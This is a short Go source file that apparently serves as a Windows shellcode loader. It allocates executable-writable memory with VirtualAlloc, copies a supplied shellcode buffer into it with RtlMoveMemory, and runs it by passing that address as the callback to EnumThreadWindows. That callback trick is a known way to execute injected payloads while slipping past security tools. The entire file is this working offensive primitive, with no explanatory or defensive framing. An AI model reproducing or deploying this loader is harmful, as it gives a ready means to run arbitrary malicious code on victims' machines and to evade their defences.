package TT

import (
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	LOCALE_ALL             = 0
	NULL                   = 0
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	User32            = syscall.MustLoadDLL("User32.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	EnumThreadWindows = User32.MustFindProc("EnumThreadWindows")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	EnumThreadWindows.Call(0, addr, NULL)
}
